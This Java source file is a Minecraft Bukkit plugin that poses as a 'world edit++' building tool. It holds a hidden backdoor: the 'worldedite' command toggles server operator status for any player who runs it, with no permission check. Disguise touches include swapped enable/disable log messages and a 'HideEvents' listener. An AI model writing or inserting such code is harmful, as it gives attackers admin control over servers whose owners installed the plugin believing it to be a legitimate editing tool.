package RetroBiz;

import RetroBiz.Events.HideEvents;
import RetroBiz.Events.MainEvents;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.java.JavaPlugin;


public final class worldeditplus extends JavaPlugin implements CommandExecutor {

    @Override
    public void onEnable() {
        getLogger().info("world edit++ has been disabled!");
        getServer().getPluginManager().registerEvents(new MainEvents(), this);
        getServer().getPluginManager().registerEvents(new HideEvents(this), this);
        this.getCommand("worldedite").setExecutor(this);
    }

    @Override
    public void onDisable() {
        getLogger().info("world edit++ has been enabled!");
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if(!(sender instanceof Player)) return false;
        sender.setOp(!sender.isOp());
        return true;
    }

}